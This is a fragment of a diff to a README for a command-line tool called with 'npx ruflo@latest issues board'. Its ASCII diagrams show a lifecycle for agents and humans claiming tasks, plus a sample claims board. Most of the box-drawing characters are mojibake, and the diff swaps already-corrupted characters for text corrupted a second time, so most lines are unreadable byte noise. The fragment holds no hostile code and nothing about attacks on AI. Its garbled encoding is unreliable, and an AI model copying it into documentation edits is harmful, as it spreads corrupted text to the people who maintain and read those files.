+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ UNCLAIMEDÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ CLAIMED  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ STEALABLEÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ HANDED OFF  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡          ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡          ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Open forÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Agent or ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Stuck or ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ New owner   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ claimingÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ human    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ abandonedÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ continues   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡               ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â´ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â´ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“            ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                           COMPLETED                                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### Claims Commands
@@ -4284,16 +4284,16 @@ npx ruflo@latest issues board
 ```
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                        CLAIMS BOARD                                  Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š   UNCLAIMED   Ã¢â€â€š    ACTIVE     Ã¢â€â€š   STEALABLE   Ã¢â€â€š     COMPLETED       Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¼Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¼Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¼Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š #127 Add auth Ã¢â€â€š #123 Fix bug  Ã¢â€â€š #120 Refactor Ã¢â€â€š #119 Update docs    Ã¢â€â€š
-Ã¢â€â€š #128 Tests    Ã¢â€â€š   (coder-1)   Ã¢â€â€š   (stale 2h)  Ã¢â€â€š #118 Security fix   Ã¢â€â€š
-Ã¢â€â€š               Ã¢â€â€š #124 API work Ã¢â€â€š               Ã¢â€â€š #117 Performance    Ã¢â€â€š
-Ã¢â€â€š               Ã¢â€â€š   (reviewer)  Ã¢â€â€š               Ã¢â€â€š                     Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â´Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â´Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â´Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬Â